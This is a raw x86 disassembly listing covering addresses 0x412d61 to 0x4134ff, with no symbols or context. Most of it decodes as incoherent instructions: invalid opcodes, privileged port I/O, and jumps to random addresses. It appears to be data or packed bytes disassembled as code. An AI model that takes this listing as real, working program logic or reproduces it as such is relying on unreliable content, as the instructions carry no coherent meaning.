  412d61:	dec    ebx
  412d63:	adc    DWORD PTR [ecx+0x20],esp
  412d66:	adc    bh,BYTE PTR [ebx]
  412d68:	(bad)  [eax+0xb]
  412d6b:	sti    
  412d6c:	(bad)  
  412d6e:	hlt    
  412d6f:	mov    WORD PTR [edx-0x10],?
  412d72:	pop    ebx
  412d73:	jb     0x412cfc
  412d75:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412d76:	xchg   ebx,eax
  412d77:	sar    DWORD PTR [edi-0x2a8fa86a],cl
  412d7d:	in     al,dx
  412d7e:	mov    ebx,0xb3207bdb
  412d83:	xchg   ebp,eax
  412d84:	scas   al,BYTE PTR es:[edi]
  412d85:	jae    0x412d20
  412d87:	inc    esi
  412d88:	dec    ebp
  412d89:	sub    DWORD PTR [esi-0x66],ecx
  412d8c:	xlat   BYTE PTR ds:[ebx]
  412d8d:	(bad)  
  412d8e:	xchg   ebx,eax
  412d8f:	test   DWORD PTR [eax-0x35],esi
  412d92:	dec    ebx
  412d93:	fdivr  QWORD PTR [eax]
  412d95:	in     al,dx
  412d96:	push   ebx
  412d97:	push   cs
  412d98:	or     BYTE PTR [ebx-0x3b],al
  412d9b:	or     dh,al
  412d9d:	daa    
  412d9e:	fs pop edi
  412da0:	and    al,BYTE PTR [edi]
  412da2:	mov    edi,0x31730112
  412da7:	dec    ecx
  412da8:	icebp  
  412da9:	push   ds
  412daa:	and    bl,dh
  412dac:	jge    0x412db9
  412dae:	std    
  412daf:	jno    0x412e2c
  412db1:	fsub   DWORD PTR [edx]
  412db3:	cmp    DWORD PTR [ecx+eax*8],edi
  412db6:	or     al,0x47
  412db8:	adc    al,0xae
  412dba:	jmp    0x896f97e6
  412dbf:	and    al,0xc2
  412dc1:	inc    edi
  412dc2:	into   
  412dc3:	add    eax,0xcafdba3f
  412dc8:	mov    ds:0xcca3df0d,al
  412dce:	mov    eax,0xb0aa9e0
  412dd3:	les    edi,FWORD PTR [eax]
  412dd5:	cmp    esp,edi
  412dd7:	out    dx,eax
  412dd8:	leave  
  412dd9:	hlt    
  412dda:	pop    ss
  412ddb:	in     eax,0x81
  412ddd:	add    BYTE PTR [ebx+0x36372506],dl
  412de3:	and    dh,bh
  412de5:	adc    eax,0x5796865e
  412dea:	push   esi
  412deb:	scas   eax,DWORD PTR es:[di]
  412ded:	mov    ds:0x3c169d1f,eax
  412df2:	dec    esi
  412df3:	mov    dl,0xe9
  412df5:	add    eax,0xdc883071
  412dfa:	out    dx,al
  412dfb:	xchg   ebp,eax
  412dfc:	sar    DWORD PTR [esi+0x18],1
  412dff:	push   0x3b
  412e01:	cwde   
  412e02:	push   0x6cddf1ab
  412e07:	pushf  
  412e08:	ret    0x40a
  412e0b:	sub    DWORD PTR [eax-0x55],ebx
  412e0e:	rcr    DWORD PTR [edx],cl
  412e10:	fsub   QWORD PTR [ecx-0xe024e06]
  412e16:	xchg   ecx,eax
  412e17:	xlat   BYTE PTR ds:[ebx]
  412e18:	fnstenv [esi+0x3b158a80]
  412e1e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412e1f:	cdq    
  412e20:	gs (bad) 
  412e22:	fwait
  412e23:	cmp    DWORD PTR [edi],esi
  412e25:	rol    DWORD PTR [eax],cl
  412e27:	xor    al,0xa2
  412e29:	cld    
  412e2a:	cmp    edi,DWORD PTR [esi+0x14]
  412e2d:	mov    al,0x4f
  412e2f:	adc    al,0xbc
  412e31:	cwde   
  412e32:	pop    ecx
  412e33:	push   ss
  412e34:	cmp    DWORD PTR [edx+0x22],ebp
  412e37:	push   edi
  412e38:	xchg   BYTE PTR [eax+0x37646cd8],dl
  412e3e:	and    bl,BYTE PTR [edi+edi*4+0x7a]
  412e42:	and    BYTE PTR [ebx],ch
  412e44:	cmp    al,BYTE PTR [ebp+edx*8+0xc]
  412e48:	gs xchg esi,eax
  412e4a:	sub    eax,0x307397d
  412e4f:	test   dl,dh
  412e51:	ret    
  412e52:	mov    eax,0xc94a004d
  412e57:	cmc    
  412e58:	hlt    
  412e59:	mov    eax,ds:0x15c4791
  412e5e:	dec    eax
  412e5f:	arpl   WORD PTR [ebp+0xe],bx
  412e62:	mov    ds:0xac23e950,eax
  412e67:	push   esp
  412e68:	sub    DWORD PTR [ebp-0x66],edx
  412e6b:	mov    ?,esp
  412e6d:	pop    esp
  412e6e:	inc    DWORD PTR [ecx+0x6a]
  412e71:	jno    0x412eb6
  412e73:	jns    0x412e72
  412e75:	nop    ebp
  412e78:	or     eax,0xe8af2665
  412e7d:	sar    bl,cl
  412e7f:	mov    ds:0x92067137,eax
  412e84:	clc    
  412e85:	cmp    ah,cl
  412e87:	push   edx
  412e88:	and    eax,0x7f77b3a4
  412e8d:	or     esp,ebp
  412e8f:	pusha  
  412e90:	nop
  412e91:	clc    
  412e92:	bound  ebp,QWORD PTR [edi]
  412e94:	adc    ebp,DWORD PTR [ecx+0x26]
  412e97:	mov    cl,BYTE PTR [esi-0x31]
  412e9a:	iret   
  412e9b:	mov    ah,0xa9
  412e9d:	pop    esi
  412e9e:	push   ebx
  412e9f:	xor    eax,0x7fa2b311
  412ea4:	and    ebp,DWORD PTR [eax-0x1f0a0f03]
  412eaa:	scas   eax,DWORD PTR es:[edi]
  412eab:	jmp    0xe816b068
  412eb0:	dec    edx
  412eb1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412eb2:	dec    esi
  412eb3:	imul   BYTE PTR [ebx]
  412eb5:	jl     0x412ee0
  412eb7:	and    al,dl
  412eb9:	pushf  
  412eba:	mov    ecx,0x540be497
  412ebf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412ec0:	jle    0x412ed5
  412ec2:	js     0x412f2a
  412ec4:	jnp    0x412ef9
  412ec6:	cmc    
  412ec7:	push   cs
  412ec8:	sti    
  412ec9:	cmp    BYTE PTR [ecx+ebp*4],bl
  412ecc:	js     0x412e50
  412ece:	loop   0x412eb4
  412ed0:	cmc    
  412ed1:	add    DWORD PTR ds:0xd1974d77,edi
  412ed7:	cli    
  412ed8:	or     BYTE PTR [ecx],ch
  412eda:	sti    
  412edb:	push   esi
  412edc:	rcl    DWORD PTR [edx-0x14],1
  412edf:	cmp    edx,edx
  412ee1:	inc    ecx
  412ee2:	ret    0x97fd
  412ee5:	(bad)  
  412ee6:	xchg   esp,eax
  412ee7:	dec    eax
  412ee8:	into   
  412ee9:	js     0x412e8c
  412eeb:	call   0xab01234c
  412ef0:	mov    cl,0xb8
  412ef2:	sbb    eax,DWORD PTR [ecx+ebx*1]
  412ef5:	xor    cl,BYTE PTR [edx+ecx*8+0x65e394e7]
  412efc:	std    
  412efd:	lods   al,BYTE PTR ds:[esi]
  412efe:	rol    BYTE PTR [edi+0x5a86e8fc],1
  412f04:	imul   esi,esi,0xcbdb9f2e
  412f0a:	mov    ebx,0x589df60
  412f0f:	nop
  412f10:	xchg   ebx,eax
  412f11:	cdq    
  412f12:	xor    DWORD PTR [eax],ebx
  412f14:	scas   eax,DWORD PTR es:[edi]
  412f15:	jg     0x412f2e
  412f17:	push   esp
  412f18:	xor    BYTE PTR [ebx+0x11],dh
  412f1b:	aaa    
  412f1c:	fwait
  412f1d:	inc    eax
  412f1e:	push   ds
  412f1f:	inc    esi
  412f20:	push   ss
  412f21:	pusha  
  412f22:	sbb    BYTE PTR [esi-0x4083e145],ch
  412f28:	push   ds
  412f29:	es pusha 
  412f2b:	int    0xe4
  412f2d:	ja     0x412ec1
  412f2f:	lds    eax,FWORD PTR [ebp-0x2e]
  412f32:	cmp    al,0x60
  412f34:	cmp    DWORD PTR [ebp+0x67121da9],0xf0bafa00
  412f3e:	add    DWORD PTR [edx+ebp*1-0x7],eax
  412f42:	xchg   esi,eax
  412f43:	adc    dl,ah
  412f45:	xchg   esp,eax
  412f46:	mov    dl,0xaf
  412f48:	lods   al,BYTE PTR ds:[esi]
  412f49:	fsub   DWORD PTR [ebp-0x36daeecc]
  412f4f:	(bad)  
  412f50:	sub    al,BYTE PTR [edx+0x12]
  412f53:	pop    ss
  412f54:	pushf  
  412f55:	leave  
  412f56:	pop    ss
  412f57:	std    
  412f58:	mov    ds:0x4a9b7721,al
  412f5d:	sbb    bh,BYTE PTR [ecx]
  412f5f:	fiadd  DWORD PTR [ebp+ecx*4-0x53]
  412f63:	call   0xeb95:0x929d3562
  412f6a:	fstp   st(1)
  412f6c:	cdq    
  412f6d:	adc    bh,BYTE PTR [ecx]
  412f6f:	adc    DWORD PTR [ebx+0x4d],esi
  412f72:	leave  
  412f73:	xchg   edx,eax
  412f74:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412f75:	jg     0x412f31
  412f77:	fcom   DWORD PTR [edi+0x45]
  412f7a:	or     al,0x33
  412f7c:	push   esp
  412f7d:	mov    ds:0x9bdf156e,al
  412f82:	pop    ecx
  412f83:	mov    bl,0x72
  412f85:	and    al,0x37
  412f87:	ss pop edx
  412f89:	add    esp,DWORD PTR [bp+di-0x2d]
  412f8d:	not    esp
  412f8f:	aam    0x67
  412f91:	jo     0x412fcf
  412f93:	in     eax,dx
  412f94:	js     0x412f78
  412f96:	out    dx,eax
  412f97:	fs (bad) 
  412f9a:	jl     0x412f3c
  412f9c:	mov    ebp,0x814695cb
  412fa1:	fs scas eax,DWORD PTR es:[edi]
  412fa3:	ja     0x412f72
  412fa5:	push   cs
  412fa6:	add    ch,cl
  412fa8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412fa9:	retf   
  412faa:	(bad)  
  412fab:	push   0x59824fa8
  412fb0:	(bad)  
  412fb1:	fidiv  WORD PTR [edx]
  412fb3:	mov    dl,0x71
  412fb5:	add    al,0xe3
  412fb7:	ret    0xe6ab
  412fba:	sub    DWORD PTR [ebx+0x71e454ca],0xffffffd1
  412fc1:	mov    ebp,0xea9ff806
  412fc6:	cmp    bh,ah
  412fc8:	hlt    
  412fc9:	jg     0x412f65
  412fcb:	xor    al,0x53
  412fcd:	pop    ds
  412fce:	je     0x412f64
  412fd0:	and    eax,0x608c724c
  412fd5:	mov    esp,0x7ac1a844
  412fda:	sti    
  412fdb:	(bad)  
  412fdd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412fde:	leave  
  412fdf:	(bad)  
  412fe0:	bound  eax,QWORD PTR [ebx]
  412fe2:	test   eax,0x79208a89
  412fe7:	cwde   
  412fe8:	sbb    eax,0x3cd94597
  412fed:	and    esp,DWORD PTR ds:0xe2c36f6a
  412ff3:	pop    DWORD PTR [edx+eax*4]
  412ff6:	mov    ch,0x8f
  412ff8:	jmp    0x8602:0xd86ddb80
  412fff:	btc    ebx,edi
  413002:	in     eax,0xd3
  413004:	xor    al,0xcb
  413006:	sub    eax,0xf232a6df
  41300b:	xor    dh,BYTE PTR [eax+0x2]
  41300e:	je     0x413017
  413010:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413011:	cdq    
  413012:	shl    DWORD PTR [esi-0x1b3d3fb6],cl
  413018:	fcomp  QWORD PTR [eax-0x11]
  41301b:	mov    ds:0xf0535902,al
  413020:	scas   eax,DWORD PTR es:[edi]
  413021:	stos   DWORD PTR es:[edi],eax
  413022:	and    BYTE PTR [eax+ebp*1],ah
  413025:	pop    es
  413026:	data16 sub ah,BYTE PTR [edi-0x5de0322e]
  41302d:	xor    dl,bh
  41302f:	adc    ah,BYTE PTR [ebp+0x10]
  413032:	fisub  DWORD PTR ds:0xcbdac04a
  413038:	push   ecx
  413039:	test   BYTE PTR [edi-0xf],dl
  41303c:	lea    ebp,[esi+0x15302550]
  413042:	into   
  413043:	rol    BYTE PTR [eax+esi*8+0x2434d579],1
  41304a:	std    
  41304b:	dec    edx
  41304c:	cli    
  41304d:	gs push esp
  41304f:	pop    ds
  413050:	scas   eax,DWORD PTR es:[edi]
  413051:	inc    esi
  413052:	jnp    0x4130c7
  413054:	leave  
  413055:	push   ebp
  413056:	(bad)  
  413057:	icebp  
  413058:	scas   al,BYTE PTR es:[edi]
  413059:	ficomp WORD PTR [ebx-0x2c]
  41305c:	xor    DWORD PTR [ebx+0x1e],esp
  41305f:	push   edi
  413060:	and    al,0x98
  413062:	out    dx,al
  413063:	xchg   esi,eax
  413064:	adc    BYTE PTR [ebx+0x17],dl
  413067:	test   al,0x7e
  413069:	rcr    DWORD PTR fs:[ebx-0x6836fd6a],1
  413070:	xor    DWORD PTR [ebp+0x16],0x3c3837e
  413077:	sbb    BYTE PTR [ecx-0x79156417],dh
  41307d:	shr    BYTE PTR [ebx-0x27],0xd6
  413081:	sar    DWORD PTR [ebp+0x4d],cl
  413084:	data16 fisttp QWORD PTR [edi-0x36]
  413088:	sub    eax,0x9b8195b6
  41308d:	and    DWORD PTR ds:[esi+0x29a9a421],ebp
  413094:	mov    al,ds:0xe10237f
  413099:	aaa    
  41309a:	jo     0x413058
  41309c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41309d:	test   BYTE PTR [ebx],0x5e
  4130a0:	xchg   edi,eax
  4130a1:	stos   DWORD PTR es:[edi],eax
  4130a2:	mov    al,0xde
  4130a4:	push   ss
  4130a5:	cmp    dl,BYTE PTR [ebx]
  4130a7:	lahf   
  4130a8:	mov    eax,ds:0xc7d6d27a
  4130ad:	sti    
  4130ae:	rol    edx,1
  4130b0:	mov    ds:0xad5b8fd5,al
  4130b5:	inc    edx
  4130b6:	xor    cl,BYTE PTR [ecx+0x21913b90]
  4130bc:	ins    DWORD PTR es:[edi],dx
  4130bd:	jnp    0x4130f8
  4130bf:	cmp    dl,dl
  4130c1:	loopne 0x4130aa
  4130c3:	mov    edx,0xc7906d20
  4130c8:	in     eax,dx
  4130c9:	push   DWORD PTR [edx+esi*4-0x240d6e3b]
  4130d0:	pop    ss
  4130d1:	lahf   
  4130d2:	hlt    
  4130d3:	mov    bl,0xf1
  4130d5:	dec    eax
  4130d6:	pusha  
  4130d7:	fs cmp eax,0x767e6c6
  4130dd:	pop    ds
  4130de:	adc    al,0x25
  4130e0:	and    al,0xc7
  4130e2:	dec    ebx
  4130e3:	fistp  QWORD PTR [ebx+0x47]
  4130e6:	into   
  4130e7:	or     BYTE PTR [ebx],dl
  4130e9:	add    bh,BYTE PTR [edi+eiz*2]
  4130ec:	sbb    DWORD PTR [edi],eax
  4130ee:	in     eax,0x37
  4130f0:	xchg   BYTE PTR [ebx],bh
  4130f2:	imul   esi,DWORD PTR [esi+0x189383bb],0x871306fa
  4130fc:	inc    ebx
  4130fd:	scas   eax,DWORD PTR es:[edi]
  4130fe:	loopne 0x413087
  413100:	cdq    
  413101:	and    BYTE PTR [eax],bh
  413103:	xor    eax,0xcdff48e5
  413108:	cmp    ecx,DWORD PTR [edi]
  41310a:	jae    0x413136
  41310c:	cmp    esi,esi
  41310e:	dec    ebp
  41310f:	mov    dl,dh
  413111:	loop   0x4130c8
  413113:	mov    ebx,0xefccbc15
  413118:	push   esi
  413119:	sahf   
  41311a:	and    BYTE PTR [edx+0x16],bl
  41311d:	scas   eax,DWORD PTR es:[edi]
  41311e:	ret    0x61ba
  413121:	data16 jmp 0x413156
  413124:	fld    DWORD PTR [ebx+0x17429f28]
  41312a:	cld    
  41312b:	test   DWORD PTR [ebp+0x76],esi
  41312e:	sti    
  41312f:	xchg   ecx,eax
  413130:	(bad)  
  413131:	ds push esp
  413133:	and    al,0x6c
  413135:	fsubrp st(1),st
  413137:	sbb    edx,edi
  413139:	out    0xd3,eax
  41313b:	test   al,0xb8
  41313d:	cli    
  41313e:	sub    BYTE PTR cs:[ebx],bl
  413141:	sbb    al,0xd0
  413143:	mov    ds:0x103fb204,eax
  413148:	outs   dx,DWORD PTR ds:[esi]
  413149:	inc    ebp
  41314a:	jns    0x4130e3
  41314c:	sub    DWORD PTR [edx+0x45],ecx
  41314f:	or     al,0x6c
  413151:	das    
  413152:	andps  xmm7,XMMWORD PTR [edx]
  413155:	out    dx,al
  413156:	lods   al,BYTE PTR ds:[esi]
  413157:	or     ecx,edx
  413159:	mov    esi,DWORD PTR [eax-0x5bb3a57c]
  41315f:	push   ecx
  413160:	xchg   esi,eax
  413161:	xchg   ebx,eax
  413162:	in     al,dx
  413163:	ins    BYTE PTR es:[edi],dx
  413164:	cmp    ebp,DWORD PTR [ebx-0x24]
  413167:	lds    esp,FWORD PTR [edx-0x5f]
  41316a:	inc    edx
  41316b:	test   BYTE PTR [eax+0xa42c961],dh
  413171:	aaa    
  413172:	pushf  
  413173:	xor    eax,DWORD PTR [esi+0x1d]
  413176:	mov    ebp,0xb8103991
  41317b:	mov    al,0x2d
  41317d:	inc    esi
  41317e:	xor    al,0x9e
  413180:	mov    ds:0xd74eb997,eax
  413185:	xchg   ebx,eax
  413186:	jnp    0x413161
  413188:	pop    ebx
  413189:	jne    0x4131b2
  41318b:	fdivr  DWORD PTR [eax+0x55]
  41318e:	pop    ss
  41318f:	sub    DWORD PTR [edx],esi
  413191:	popf   
  413192:	mov    ah,0x63
  413194:	fisubr DWORD PTR [ebx+0x3c]
  413197:	in     al,dx
  413198:	lea    esp,[ebx]
  41319a:	not    BYTE PTR [eax-0x5]
  41319d:	in     eax,dx
  41319e:	loopne 0x413192
  4131a0:	sub    DWORD PTR [ecx],ebx
  4131a2:	cwde   
  4131a3:	in     eax,0x9f
  4131a5:	cmc    
  4131a6:	add    dl,BYTE PTR [edx]
  4131a8:	add    eax,0xe6c0c543
  4131ad:	in     eax,dx
  4131ae:	push   edx
  4131af:	out    dx,al
  4131b0:	and    BYTE PTR [esi-0x39a4f647],al
  4131b6:	push   edx
  4131b7:	hlt    
  4131b8:	cmp    eax,0x98b3cea3
  4131bd:	xchg   BYTE PTR [edi+edi*4-0x1a],bh
  4131c1:	sub    cl,BYTE PTR [ebx-0x4ef2840e]
  4131c7:	push   ds
  4131c8:	or     al,0x79
  4131ca:	mov    ds:0x9c58c5e1,al
  4131cf:	ss jmp 0x4131bc
  4131d2:	(bad)  
  4131d3:	ja     0x41316b
  4131d5:	cmp    esp,DWORD PTR [edi+0x3679aed0]
  4131db:	inc    edx
  4131dc:	(bad)  
  4131dd:	adc    DWORD PTR [eax+0x508f9d67],ebx
  4131e3:	add    al,0x93
  4131e5:	mov    eax,0xcebd204
  4131ea:	jae    0x413256
  4131ec:	lock add BYTE PTR ds:0x2f11937,0x65
  4131f4:	sbb    al,0xf4
  4131f6:	pop    es
  4131f7:	inc    esp
  4131f8:	sub    edx,DWORD PTR [edx+0x39]
  4131fb:	mov    esi,0xdaa77719
  413200:	push   eax
  413201:	jo     0x4131f9
  413203:	mov    ebp,0x9a710af2
  413208:	and    BYTE PTR [edx+0x30c489c9],ah
  41320e:	sub    BYTE PTR [edx-0x71],al
  413211:	pushf  
  413212:	mov    dh,BYTE PTR [eax+esi*8]
  413215:	data16 add ah,BYTE PTR [ebp+0x47]
  413219:	mov    ecx,cr0
  41321c:	icebp  
  41321d:	dec    esi
  41321e:	and    DWORD PTR [ebx+0x59],edi
  413221:	push   edx
  413222:	mov    dh,0x19
  413224:	cmp    DWORD PTR [eax],0x6e1d5fe1
  41322a:	sub    eax,0x3d54ca89
  41322f:	jmp    0x41326c
  413231:	adc    DWORD PTR [edx-0x25],edx
  413234:	mov    bh,0x18
  413236:	mov    cl,0x8e
  413238:	loop   0x413239
  41323a:	inc    esp
  41323b:	inc    ebp
  41323c:	cld    
  41323d:	dec    esp
  41323e:	inc    eax
  41323f:	pop    ss
  413240:	sahf   
  413241:	push   ecx
  413242:	hlt    
  413243:	repnz mov cl,0x47
  413246:	ret    
  413247:	adc    ebp,DWORD PTR [ebx]
  413249:	lods   eax,DWORD PTR ds:[esi]
  41324a:	or     ch,BYTE PTR [esi+eax*8-0x672dc56d]
  413251:	push   0xca1f43ae
  413256:	cld    
  413257:	shr    BYTE PTR [esi+edi*4],cl
  41325a:	loopne 0x4131f0
  41325c:	xchg   esi,eax
  41325d:	pop    esp
  41325e:	(bad)  
  41325f:	into   
  413260:	fdiv   st(2),st
  413262:	inc    esp
  413263:	jne    0x4132d1
  413265:	or     eax,0x67bf116
  41326a:	pop    es
  41326b:	xor    dh,BYTE PTR [eax-0x10fa73f6]
  413271:	adc    al,0x93
  413273:	pop    eax
  413274:	scas   eax,DWORD PTR es:[edi]
  413275:	sbb    dl,BYTE PTR [ebx-0x55aee981]
  41327b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41327c:	in     al,dx
  41327d:	pop    ecx
  41327e:	pop    esp
  41327f:	push   0xffffff97
  413281:	test   al,0xd7
  413283:	cdq    
  413284:	mov    bh,0x81
  413286:	mov    ?,WORD PTR [esi+edx*8-0x55410767]
  41328d:	push   ss
  41328e:	(bad)  [edx-0x62db1ae]
  413294:	and    al,0xba
  413296:	adc    DWORD PTR [edx-0x337d22cb],0x3a
  41329d:	xor    DWORD PTR cs:[edi+0xdd152ab],esp
  4132a4:	out    dx,eax
  4132a5:	icebp  
  4132a6:	mov    bh,0xe4
  4132a8:	sub    edi,DWORD PTR [eax-0x47]
  4132ab:	xchg   ecx,eax
  4132ac:	pop    ebp
  4132ad:	or     ch,BYTE PTR [ebx+0x28]
  4132b0:	es (bad) 
  4132b2:	rcl    DWORD PTR [edi+0x1f],cl
  4132b5:	adc    esp,esi
  4132b7:	adc    BYTE PTR [ecx],dl
  4132b9:	rol    DWORD PTR [edi+eax*2+0x63fe52fd],1
  4132c0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4132c1:	lea    edx,[ebx]
  4132c3:	les    eax,FWORD PTR [ebx+edi*8+0x3351a144]
  4132ca:	mov    esi,0x3dc568f8
  4132cf:	lock jp 0x4132f6
  4132d2:	enter  0xac76,0xd8
  4132d6:	inc    esp
  4132d7:	add    edi,ecx
  4132d9:	pop    eax
  4132da:	fmul   QWORD PTR [edx+0x43]
  4132dd:	mov    bl,BYTE PTR [eax]
  4132df:	xor    dl,dl
  4132e1:	dec    edi
  4132e2:	sbb    DWORD PTR [ecx],ecx
  4132e4:	cli    
  4132e5:	loopne 0x4132cf
  4132e7:	sbb    DWORD PTR [esi+0x11c721a7],ebp
  4132ed:	fbld   TBYTE PTR [edx]
  4132ef:	loope  0x4132cc
  4132f1:	dec    eax
  4132f2:	sub    bh,al
  4132f4:	and    esp,ebp
  4132f6:	sar    DWORD PTR [edx+0x26],cl
  4132f9:	out    0x99,eax
  4132fb:	dec    ebx
  4132fc:	xor    al,0xa8
  4132fe:	push   eax
  4132ff:	cmc    
  413300:	jg     0x41332c
  413302:	int3   
  413303:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413304:	popa   
  413305:	scas   eax,DWORD PTR es:[edi]
  413306:	imul   eax,DWORD PTR [edx+eax*4+0x7f],0x3a
  41330b:	leave  
  41330c:	add    BYTE PTR [ebx-0x2bf77173],dl
  413312:	add    esp,DWORD PTR [esi*8-0x121c6427]
  413319:	cmp    eax,0xf3f96b5a
  41331e:	ret    0x2bb8
  413321:	lods   eax,DWORD PTR gs:[esi]
  413323:	xchg   ebx,eax
  413324:	push   0xc55c2511
  413329:	fld    TBYTE PTR [ebx+esi*4-0x78c63370]
  413330:	loop   0x4132bb
  413332:	mov    ah,0xff
  413334:	imul   edi,DWORD PTR [ecx],0x7e
  413337:	jl     0x4132ca
  413339:	daa    
  41333a:	dec    ecx
  41333b:	call   0x5c8b02ae
  413340:	jmp    0x84954c22
  413345:	add    DWORD PTR [edi-0x9d8035],eax
  41334b:	mov    BYTE PTR [ebp+0x13715ec],bh
  413351:	pop    ebx
  413352:	and    al,BYTE PTR [ecx]
  413354:	mov    dl,ah
  413356:	cli    
  413357:	je     0x4133b8
  413359:	jb     0x413363
  41335b:	daa    
  41335c:	(bad)  
  41335d:	push   eax
  41335e:	je     0x4133d6
  413360:	jecxz  0x413348
  413362:	or     BYTE PTR [ebx],0x65
  413365:	sbb    bh,BYTE PTR [edx-0x60]
  413368:	push   eax
  413369:	jne    0x4133d9
  41336b:	stos   DWORD PTR es:[edi],eax
  41336c:	xchg   ebx,eax
  41336d:	dec    eax
  41336e:	mov    ebp,0xd3cb6f82
  413373:	popa   
  413374:	lahf   
  413375:	dec    ecx
  413376:	pop    ds
  413377:	jae    0x413389
  413379:	das    
  41337a:	ret    0xb040
  41337d:	xor    al,0x60
  41337f:	adc    eax,DWORD PTR [esi]
  413381:	mov    bh,0x1c
  413383:	xor    eax,0xd0cc1962
  413388:	div    esi
  41338a:	dec    ebx
  41338b:	(bad)  
  41338c:	fbstp  TBYTE PTR [eax+0x5b]
  41338f:	jnp    0x4133e4
  413391:	shr    DWORD PTR [ecx],cl
  413393:	and    ch,dh
  413395:	push   ss
  413396:	repz imul edx,DWORD PTR [eax+0x49],0x46
  41339b:	ds add ebx,esi
  41339e:	and    al,0xed
  4133a0:	push   ss
  4133a1:	aaa    
  4133a2:	(bad)  
  4133a3:	sbb    BYTE PTR [ebx],bh
  4133a5:	ja     0x413337
  4133a7:	mov    ebx,0x1caf4bb1
  4133ac:	arpl   WORD PTR [edi+edx*8+0x256b9264],bp
  4133b3:	in     al,0xf8
  4133b5:	std    
  4133b6:	iret   
  4133b7:	inc    ebp
  4133b8:	push   esp
  4133b9:	(bad)  
  4133ba:	fsubr  DWORD PTR [ebp+0x6934a01f]
  4133c0:	and    al,0xda
  4133c2:	lea    esi,[esi]
  4133c4:	out    0x5a,eax
  4133c6:	sar    BYTE PTR [edx+0x541f9735],cl
  4133cc:	call   0xe89900b0
  4133d1:	test   DWORD PTR [eax-0x7b854148],ebx
  4133d7:	mov    eax,0xe2d066b
  4133dc:	loopne 0x4133a6
  4133de:	dec    esi
  4133df:	jns    0x413371
  4133e1:	aaa    
  4133e2:	jmp    0x7d53b293
  4133e7:	repz cmp eax,0x1714a186
  4133ed:	(bad)  
  4133ee:	loopne 0x413377
  4133f0:	or     al,0x9
  4133f2:	pop    ebx
  4133f3:	xchg   DWORD PTR [eax-0x2915e003],ebp
  4133f9:	mov    edi,0x9c7c19a6
  4133fe:	js     0x4133ba
  413400:	xlat   BYTE PTR ds:[ebx]
  413401:	add    DWORD PTR [ebp-0x52aaa961],ebx
  413407:	call   DWORD PTR [eax-0x2a1afca5]
  41340d:	ret    0xcaed
  413410:	inc    eax
  413411:	cmc    
  413412:	mov    bh,0xb
  413414:	xchg   ebx,eax
  413415:	add    esi,0x4b
  413418:	jno    0x413469
  41341a:	aas    
  41341b:	in     al,dx
  41341c:	lods   al,BYTE PTR ds:[esi]
  41341d:	sbb    ah,dl
  41341f:	mov    ecx,0x5190bdb6
  413424:	and    eax,DWORD PTR [eax-0x43bd0b31]
  41342a:	aam    0xb8
  41342c:	into   
  41342d:	pop    ds
  41342e:	cmpps  xmm0,XMMWORD PTR [ebx+edi*2],0x8b
  413433:	iret   
  413434:	xor    eax,0xe3d5356e
  413439:	ret    
  41343a:	sar    al,0x1a
  41343d:	retf   0xd59a
  413440:	mov    WORD PTR [edi],gs
  413442:	dec    edi
  413443:	jae    0x41346c
  413445:	outs   dx,DWORD PTR ds:[esi]
  413446:	mov    ah,0x8f
  413448:	jge    0x4134c2
  41344a:	lea    esp,[ecx]
  41344c:	and    DWORD PTR [ebx],ebx
  41344e:	and    al,0xf8
  413450:	xchg   ebx,eax
  413451:	jge    0x413469
  413453:	outs   dx,DWORD PTR ds:[esi]
  413454:	xor    eax,0x456a1cee
  413459:	push   edx
  41345a:	jg     0x413482
  41345c:	xchg   edx,eax
  41345d:	push   ebx
  41345e:	sub    al,BYTE PTR [ebx]
  413460:	xchg   ebp,esi
  413462:	mov    bl,0xb
  413464:	sub    cl,bh
  413466:	aaa    
  413467:	leave  
  413468:	(bad)  
  413469:	mov    dl,0xec
  41346b:	popa   
  41346c:	cmp    eax,0xb02a08a
  413471:	std    
  413472:	out    0xc,eax
  413474:	push   esp
  413475:	jle    0x413457
  413477:	nop
  413478:	(bad)  
  413479:	jge    0x413413
  41347b:	sub    BYTE PTR [ebp+0x777b3b69],ch
  413481:	arpl   WORD PTR [eax],bx
  413483:	lahf   
  413484:	mov    ebx,0x237c1cfd
  413489:	aaa    
  41348a:	xchg   edi,eax
  41348b:	popf   
  41348c:	jae    0x41346b
  41348e:	ja     0x413447
  413490:	das    
  413491:	adc    eax,0x46e54379
  413496:	sbb    al,BYTE PTR [eax]
  413498:	xchg   ebx,eax
  413499:	cmc    
  41349a:	in     eax,dx
  41349b:	data16 mov dh,0xc6
  41349e:	arpl   WORD PTR [ebx+0x16],sp
  4134a1:	fcmovu st,st(7)
  4134a3:	loope  0x413470
  4134a5:	mov    ah,0xf7
  4134a7:	mov    BYTE PTR [ecx+0xf],al
  4134aa:	add    ecx,DWORD PTR [ebp+0x4066214e]
  4134b0:	or     al,BYTE PTR [eax]
  4134b2:	mov    esp,0x9a1091d8
  4134b7:	jg     0x413483
  4134b9:	and    DWORD PTR [eax+0x2],edx
  4134bc:	push   esp
  4134bd:	jle    0x41345f
  4134bf:	mov    ecx,0x63e76d1c
  4134c4:	mov    ds:0x2c93799a,al
  4134c9:	in     eax,0x28
  4134cb:	test   edi,0x32b52955
  4134d1:	int3   
  4134d2:	push   cs
  4134d3:	jne    0x4134ab
  4134d5:	sbb    ebx,DWORD PTR [edx]
  4134d7:	jg     0x41345f
  4134d9:	jnp    0x413508
  4134db:	pop    esi
  4134dc:	out    0xa8,eax
  4134de:	test   eax,esi
  4134e0:	mov    edi,DWORD PTR [ebx+ebp*1]
  4134e3:	cmp    edx,ecx
  4134e5:	xor    bl,cl
  4134e7:	sub    dh,BYTE PTR [eax+0x44]
  4134ea:	cwde   
  4134eb:	and    ch,BYTE PTR es:0xbeee37b0
  4134f2:	xor    eax,0xcba6cdb4
  4134f7:	retf   0x7331
  4134fa:	mov    al,ds:0xa021800f
  4134ff:	inc    eax
